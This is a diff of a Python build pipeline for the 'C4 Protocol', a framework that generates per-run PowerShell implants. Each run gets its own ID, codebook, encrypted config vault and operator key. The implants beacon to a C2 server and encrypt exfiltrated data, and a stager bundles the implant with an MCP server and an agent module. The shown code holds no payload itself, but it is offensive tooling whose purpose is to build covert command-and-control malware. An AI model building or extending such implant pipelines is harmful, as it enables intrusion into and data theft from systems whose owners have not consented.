@@ -1,130 +1,95 @@
 #!/usr/bin/env python3
 """
-Master pipeline: codebook → dataset → train → export → assemble.
+Master pipeline: codebook → dataset → config → assemble → stager.
+This is the math-free version of the C4 Protocol using an Encrypted Vault.
 
-Produces a self-contained Collect-Decode.ps1 with embedded C# inference
-engine and gzip-compressed model weights.
-
-Usage:
-    python run.py                  # run full pipeline
-    python run.py --step codebook  # only regenerate codebook
-    python run.py --step dataset   # only regenerate dataset
-    python run.py --step train     # only retrain model
-    python run.py --step export    # only export weights to JSON
-    python run.py --step assemble  # only assemble Collect-Decode.ps1
-    python run.py --skip-train     # codebook + dataset only
-    python run.py --epochs 30      # override training epochs
+Each run produces a unique implant instance under out/<implant-id>/ with its
+own codebook, salt, config, and stager.  The C2 server uses the implant ID
+(received in beacons) to look up the correct directory for key/codebook lookup.
 """
 
 import argparse
 import base64
-import gzip
-import json
-import re
+import shutil
 import subprocess
 import sys
 import time
+import uuid
 from pathlib import Path
 from typing import Any
 
 from rich.console import Console
 from rich.panel import Panel
-from rich.table import Table
-from rich.text import Text
 
 console = Console()
 
-# Base directory — all paths are resolved relative to the script location.
+# Base directory
 DIR: Path = Path(__file__).parent
-OUT: Path = DIR / "out"
 
-# Each step definition has a "script" (Python file to run), "description"
-# (shown in the Rich UI), and "args" (lambda that builds CLI args from the
-# parsed argparse.Namespace).  The "assemble" step is handled separately
-# since it runs inline rather than shelling out to a subprocess.
 StepDef = dict[str, Any]
 
-STEPS: dict[str, StepDef] = {
-    "codebook": {
-        "script": "build/generate_codebook.py",
-        "description": "Generate codebook from implant_actions.yaml",
-        "args": lambda a: [
-            "--actions",
-            str(DIR / a.actions),
-            "--output",
-            str(OUT / "codebook.yaml"),
-            "--tool-codes",
-            str(a.tool_codes),
-            "--param-codes",
-            str(a.param_codes),
-            "--seed",
-            str(a.seed),
-        ],
-    },
-    "dataset": {
-        "script": "build/generate_dataset.py",
-        "description": "Generate training dataset with salt and decoys",
-        "args": lambda a: (
-            [
-                "--codebook",
-                str(OUT / "codebook.yaml"),
+
+def _make_steps(instance_dir: Path) -> dict[str, StepDef]:
+    """Build step definitions targeting a specific instance directory."""
+    return {
+        "codebook": {
+            "script": "build/generate_codebook.py",
+            "description": "Generate codebook from implant_actions.yaml",
+            "args": lambda a: [
+                "--actions",
+                str(DIR / a.actions),
                 "--output",
-                str(OUT / "dataset.json"),
-                "--num-examples",
-                str(a.num_examples),
-                "--num-decoys",
-                str(a.num_decoys),
-                "--salt-file",
-                str(OUT / "salt.txt"),
+                str(instance_dir / "codebook.yaml"),
+                "--tool-codes",
+                str(a.tool_codes),
+                "--param-codes",
+                str(a.param_codes),
                 "--seed",
                 str(a.seed),
-            ]
-            + (
-                ["--public-key", str(DIR / a.public_key)]
-                if a.public_key
-                else []
-            )
-        ),
-    },
-    "train": {
-        "script": "build/train_seq2seq.py",
-        "description": "Train seq2seq model",
-        "args": lambda a: [
-            "--dataset",
-            str(OUT / "dataset.json"),
-            "--output",
-            str(OUT / "models" / "seq2seq_model.pt"),
-            "--epochs",
-            str(a.epochs),
-            "--seed",
-            str(a.seed),
-        ],
-    },
-    "export": {
-        "script": "build/export_weights.py",
-        "description": "Export model weights to SafeTensors",
-        "args": lambda _a: [
-            "--checkpoint",
-            str(OUT / "models" / "seq2seq_model.pt"),
-            "--vocab",
-            str(OUT / "models" / "seq2seq_model_onnx" / "vocab.json"),
-            "--salt-file",
-            str(OUT / "salt.txt"),
-            "--value-codebook",
-            str(DIR / "value_codebook.yaml"),
-            "--output",
-            str(OUT / "weights.safetensors"),
-        ],
-    },
-}
+            ],
+        },
+        "dataset": {
+            "script": "build/generate_dataset.py",
+            "description": "Generate testing dataset with salt",
+            "args": lambda a: (
+                [
+                    "--codebook",
+                    str(instance_dir / "codebook.yaml"),
+                    "--output",
+                    str(instance_dir / "dataset.json"),
+                    "--num-examples",
+                    "1000",
+                    "--num-decoys",
+                    "100",
+                    "--salt-file",
+                    str(instance_dir / "salt.txt"),
+                    "--seed",
+                    str(a.seed),
+                ]
+                + (["--public-key", str(DIR / a.public_key)] if a.public_key else [])
+            ),
+        },
+        "config": {
+            "script": "build/export_config.py",
+            "description": "Export encrypted configuration vault",
+            "args": lambda _a: [
+                "--codebook",
+                str(instance_dir / "codebook.yaml"),
+                "--value-codebook",
+                str(DIR / "value_codebook.yaml"),
+                "--salt-file",
+                str(instance_dir / "salt.txt"),
+                "--output",
+                str(instance_dir / "config.enc"),
+            ],
+        },
+    }
 
-# Execution order for the full pipeline.  --skip-train omits train/export/assemble;
-# --skip-assemble omits export/assemble.  --step runs a single step in isolation.
-STEP_ORDER: list[str] = ["codebook", "dataset", "train", "export", "assemble"]
+
+STEP_ORDER: list[str] = ["codebook", "dataset", "config", "assemble", "stager"]
 
 
 def format_size(size_bytes: float) -> str:
-    """Format byte count as human-readable string."""
     for unit in ("B", "KB", "MB", "GB"):
         if size_bytes < 1024:
             return f"{size_bytes:.1f} {unit}"
@@ -133,7 +98,6 @@ def format_size(size_bytes: float) -> str:
 
 
 def format_duration(seconds: float) -> str:
-    """Format seconds as human-readable duration."""
     if seconds < 60:
         return f"{seconds:.1f}s"
     minutes = int(seconds // 60)
@@ -142,157 +106,125 @@ def format_duration(seconds: float) -> str:
 
 
 def run_step(name: str, step_def: StepDef, args: argparse.Namespace) -> None:
-    """Run a single pipeline step as a subprocess.
-
-    Prints the command, streams output, and exits the pipeline on failure.
-    """
     script: Path = DIR / step_def["script"]
     cmd: list[str] = [sys.executable, str(script)] + step_def["args"](args)
-
     console.rule(f"[bold cyan]{name}[/] — {step_def['description']}")
     console.print(f"[dim]$ {' '.join(cmd)}[/]\n")
-
     start: float = time.time()
     result = subprocess.run(cmd)
     elapsed: float = time.time() - start
-
     if result.returncode != 0:
         console.print(f"\n[bold red]FAILED[/] {name} (exit code {result.returncode})")
         sys.exit(result.returncode)
-
     console.print(f"\n[green]✓[/] {name} completed in {format_duration(elapsed)}\n")
 
 
-def assemble_ps1() -> None:
-    """Assemble self-contained PS1 deployment artifacts with embedded weights.
-
-    Reads ``weights.safetensors`` (from the export step), gzip-compresses it, base64-
-    encodes it, and injects the blob into each PS1 template — replacing the
-    ``__WEIGHTS_BASE64__`` placeholder.
-
-    Assembles two scripts:
-    - ``Collect-Decode.ps1`` — scan + decode only
-    - ``c4-invoke-pshagent.ps1`` — scan + decode + execute via PshAgent
-
-    Templates are either dedicated ``.template`` files or derived from existing
-    assembled scripts by blanking out their weights here-strings.
-    """
+def assemble_ps1(args: argparse.Namespace, instance_dir: Path) -> None:
     console.rule("[bold cyan]assemble[/] — Assemble self-contained PS1 scripts")
-
-    weights_path = OUT / "weights.safetensors"
-
-    if not weights_path.exists():
-        console.print(f"[bold red]MISSING[/] {weights_path}")
+    config_path = instance_dir / "config.enc"
+    if not config_path.exists():
+        console.print(f"[bold red]MISSING[/] {config_path}")
         sys.exit(1)
 
     start = time.time()
+    # Encrypted config is already binary, just base64 it
+    raw_config = config_path.read_bytes()
+    b64 = base64.b64encode(raw_config).decode("ascii")
 
-    # Gzip + base64 encode weights (shared across both scripts)
-    console.print("[dim]Compressing weights...[/]")
-    raw_json = weights_path.read_bytes()
-    compressed = gzip.compress(raw_json, compresslevel=9)
-    b64 = base64.b64encode(compressed).decode("ascii")
+    # Load operator public key
+    if args.public_key:
+        pubkey_path = DIR / args.public_key
+        pubkey_b64 = base64.b64encode(pubkey_path.read_bytes()).decode("ascii")
+        console.print(
+            f"[dim]  Operator key: {pubkey_path.name} ({format_size(pubkey_path.stat().st_size)})[/]"
+        )
+    else:
+        pubkey_b64 = ""
+        console.print(
+            "[yellow]  WARNING: No --public-key provided. Exfil encryption will be disabled.[/]"
+        )
 
     console.print(
-        f"[dim]  Raw: {format_size(len(raw_json))}"
-        f"  Gzip: {format_size(len(compressed))}"
-        f"  Base64: {format_size(len(b64))}[/]"
+        f"[dim]  Vault Size: {format_size(len(raw_config))}  Base64: {format_size(len(b64))}[/]"
     )
 
-    # Assemble each script
     targets = [
-        ("Collect-Decode.ps1", DIR / "Collect-Decode.ps1.template"),
-        ("c4-invoke-pshagent.ps1", DIR / "runtime" / "c4-invoke-pshagent.ps1.template"),
+        ("c4-implant.ps1", DIR / "runtime" / "c4-implant.ps1.template"),
     ]
 
     for name, template_path in targets:
-        output_path = OUT / name
-
-        if template_path.exists():
-            template = template_path.read_text()
-        else:
-            template = _build_ps1_template(output_path)
-
-        output = template.replace("__WEIGHTS_BASE64__", b64)
+        output_path = instance_dir / name
+        template = template_path.read_text()
+        output = template.replace("__VAULT_B64__", b64)
+        output = output.replace("__OPERATOR_PUBKEY__", pubkey_b64)
         output_path.write_text(output)
-
         console.print(f"[dim]  {name} ({format_size(len(output))})[/]")
 
     elapsed = time.time() - start
     console.print(f"\n[green]✓[/] assemble completed in {format_duration(elapsed)}\n")
 
 
-def _build_ps1_template(script_path: Path) -> str:
-    """Extract a reusable template from an existing assembled PS1 script.
+def assemble_stager(
+    args: argparse.Namespace, instance_dir: Path, implant_id: str
+) -> None:
+    console.rule("[bold cyan]stager[/] — Assemble full-deploy RC stager")
+    start = time.time()
 
-    Reads the assembled script and replaces the weights here-string contents
-    with a ``__WEIGHTS_BASE64__`` placeholder so the assemble step can inject
-    fresh weights on each run.
-
-    Exits with an error if the script is not found.
-    """
-    existing = script_path
-    if existing.exists():
-        content = existing.read_text()
-        pattern = r"(\$WeightsBase64 = @'\n).*?(\n'@)"
-        replacement = r"\g<1>__WEIGHTS_BASE64__\g<2>"
-        result = re.sub(pattern, replacement, content, flags=re.DOTALL)
-        if "__WEIGHTS_BASE64__" in result:
-            return result
-
-    console.print(
-        f"[yellow]Warning: Could not find {script_path.name} to use as template.[/]"
+    mcp_server = DIR / "runtime" / "mcp_server.py"
+    implant = instance_dir / "c4-implant.ps1"
+    pshagent_dir = (
+        Path(args.pshagent_dir) if args.pshagent_dir else DIR.parent / "PshAgent"
     )
-    console.print("[yellow]Please create it manually or restore from git.[/]")
-    sys.exit(1)
+    template = DIR / "stager" / "rc_stager_full.ps1.template"
+    output = instance_dir / "rc_stager_full.ps1"
 
+    for label, path in [
+        ("MCP server", mcp_server),
+        ("Implant", implant),
+        ("PshAgent", pshagent_dir),
+        ("Template", template),
+    ]:
+        if not path.exists():
+            console.print(f"[bold red]MISSING[/] {label}: {path}")
+            sys.exit(1)
 
-def show_summary() -> None:
-    """Display a Rich panel with training results from the model metadata file."""
-    meta_path: Path = OUT / "models" / "seq2seq_model_meta.json"
-    if not meta_path.exists():
-        return
+    cmd: list[str] = [
+        sys.executable,
+        str(DIR / "build" / "assemble_stager.py"),
+        "--mcp-server",
+        str(mcp_server),
+        "--implant",
+        str(implant),
+        "--pshagent-dir",
+        str(pshagent_dir),
+        "--template",
+        str(template),
+        "--output",
+        str(output),
+        "--implant-id",
+        implant_id,
+    ]
+    console.print(f"[dim]$ {' '.join(cmd)}[/]\n")
+    result = subprocess.run(cmd)
+    if result.returncode != 0:
+        console.print(f"\n[bold red]FAILED[/] stager (exit code {result.returncode})")
+        sys.exit(result.returncode)
 
-    with open(meta_path) as f:
-        meta: dict = json.load(f)
+    # Copy operator public key into instance dir for C2 lookup
+    if args.public_key:
+        pubkey_src = DIR / args.public_key
+        if pubkey_src.exists():
+            shutil.copy2(pubkey_src, instance_dir / pubkey_src.name)
 
-    accuracy: float = meta["accuracy"]
-    acc_color: str = (
-        "green" if accuracy >= 0.95 else "yellow" if accuracy >= 0.80 else "red"
-    )
-
-    table = Table(show_header=False, box=None, padding=(0, 2))
-    table.add_column(style="bold")
-    table.add_column()
-
-    table.add_row("Model (PT)", meta["model_path"])
-    table.add_row("  PT size", format_size(meta["model_size_bytes"]))
-    if "onnx_dir" in meta:
-        table.add_row("Model (ONNX)", meta["onnx_dir"])
-        table.add_row("  ONNX size", format_size(meta.get("onnx_model_size_bytes", 0)))
-    table.add_row("Parameters", f"{meta['parameters']:,}")
-    table.add_row("Vocab size", f"{meta['vocab_size']:,}")
-    table.add_row("Accuracy", Text(f"{accuracy:.1%}", style=f"bold {acc_color}"))
-    table.add_row("Val loss", f"{meta['val_loss']:.6f}")
-    table.add_row("Epochs", str(meta["epochs"]))
-    table.add_row(
-        "Train / Val", f"{meta['train_examples']:,} / {meta['val_examples']:,}"
-    )
-
-    console.print()
-    console.print(Panel(table, title="[bold]Pipeline Results[/]", border_style="green"))
+    elapsed = time.time() - start
+    console.print(f"\n[green]✓[/] stager completed in {format_duration(elapsed)}\n")
 
 
 def main() -> None:
-    """Parse CLI args and run the selected pipeline steps in order."""
-    parser = argparse.ArgumentParser(description="C4 Protocol master pipeline")
-    parser.add_argument("--step", choices=STEP_ORDER, help="Run only this step")
-    parser.add_argument("--skip-train", action="store_true", help="Skip training step")
-    parser.add_argument(
-        "--skip-assemble",
-        action="store_true",
-        help="Skip export + assemble steps",
+    parser = argparse.ArgumentParser(
+        description="C4 Protocol master pipeline (Math-free)"
     )
+    parser.add_argument("--step", choices=STEP_ORDER, help="Run only this step")
     parser.add_argument(
         "--actions", default="implant_actions.yaml", help="Actions YAML input"
     )
@@ -301,51 +233,59 @@ def main() -> None:
         "--param-codes", type=int, default=100, help="Codewords per parameter"
     )
     parser.add_argument(
-        "--num-examples", type=int, default=8000, help="Real training examples"
-    )
-    parser.add_argument(
-        "--num-decoys", type=int, default=1500, help="Decoy training examples"
-    )
-    parser.add_argument(
-        "--public-key",
-        type=str,
+        "--seed",
+        type=int,
         default=None,
-        help="Path to RSA public key XML to derive salt from (random if omitted)",
+        help="Random seed (default: random per instance)",
     )
-    parser.add_argument("--epochs", type=int, default=80, help="Training epochs")
-    parser.add_argument("--seed", type=int, default=42, help="Random seed")
+    parser.add_argument(
+        "--public-key", default=None, help="Path to X25519 public key file"
+    )
+    parser.add_argument(
+        "--pshagent-dir",
+        default=None,
+        help="Path to PshAgent module directory (default: ../PshAgent)",
+    )
     args = parser.parse_args()
 
-    console.print(Panel("[bold]C4 Protocol Pipeline[/]", border_style="cyan"))
+    # Generate implant ID and per-instance seed
+    implant_id = str(uuid.uuid4())
+    if args.seed is None:
+        args.seed = uuid.UUID(implant_id).int % (2**31)
 
-    # Ensure models directory exists
-    OUT.mkdir(exist_ok=True)
-    (OUT / "models").mkdir(exist_ok=True)
+    instance_dir = DIR / "out" / implant_id
+    instance_dir.mkdir(parents=True, exist_ok=True)
+
+    steps_defs = _make_steps(instance_dir)
+
+    console.print(
+        Panel(
+            f"[bold]C4 Protocol Pipeline (Encrypted Map Version)[/]\n"
+            f"[dim]Implant ID:[/] {implant_id}\n"
+            f"[dim]Instance:  [/] {instance_dir}\n"
+            f"[dim]Seed:      [/] {args.seed}",
+            border_style="cyan",
+        )
+    )
 
     if args.step:
-        steps: list[str] = [args.step]
+        steps = [args.step]
     else:
-        skip = set()
-        if args.skip_train:
-            skip.update({"train", "export", "assemble"})
-        if args.skip_assemble:
-            skip.update({"export", "assemble"})
-        steps = [s for s in STEP_ORDER if s not in skip]
+        steps = STEP_ORDER
 
     pipeline_start: float = time.time()
     for name in steps:
         if name == "assemble":
-            assemble_ps1()
+            assemble_ps1(args, instance_dir)
+        elif name == "stager":
+            assemble_stager(args, instance_dir, implant_id)
         else:
-            run_step(name, STEPS[name], args)
+            run_step(name, steps_defs[name], args)
     pipeline_elapsed: float = time.time() - pipeline_start
-
-    # Show summary if training was included
-    if "train" in steps:
-        show_summary()
 
     console.rule("[bold green]Pipeline complete[/]")
     console.print(f"[dim]Total time: {format_duration(pipeline_elapsed)}[/]")
+    console.print(f"[bold]Instance:[/] {instance_dir}")
 
 
 if __name__ == "__main__":
